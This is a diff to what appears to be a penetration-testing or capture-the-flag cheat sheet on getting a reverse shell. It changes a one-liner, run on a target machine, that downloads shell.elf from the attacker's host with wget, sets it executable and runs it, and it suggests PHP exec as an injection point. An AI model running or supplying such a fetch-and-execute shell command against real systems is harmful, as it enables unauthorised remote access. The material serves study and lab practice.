@@ -29,7 +29,7 @@ This is a very useful thing to have. This can also be upgraded to a semi-interac
 - The sever should be hosted exactly where the previously generated `shell.elf` is located
 
 ### Where you can run code on the target machine, enter the following
-- `cd /tmp; rm -f /tmp/shell.elf; curl http://<Your IP>:<8000 or port you chose>/shell.elf; chmod 777 shell.elf; /tmp/shell.elf`
+- `cd /tmp; rm -f /tmp/shell.elf; wget http://<Your IP>:<8000 or port you chose>/shell.elf; chmod 777 shell.elf; /tmp/shell.elf`
     - For example in a PHP file where you can use `exec`, be smart and use google to find a way
 
 ### Find a way to get your code to execute
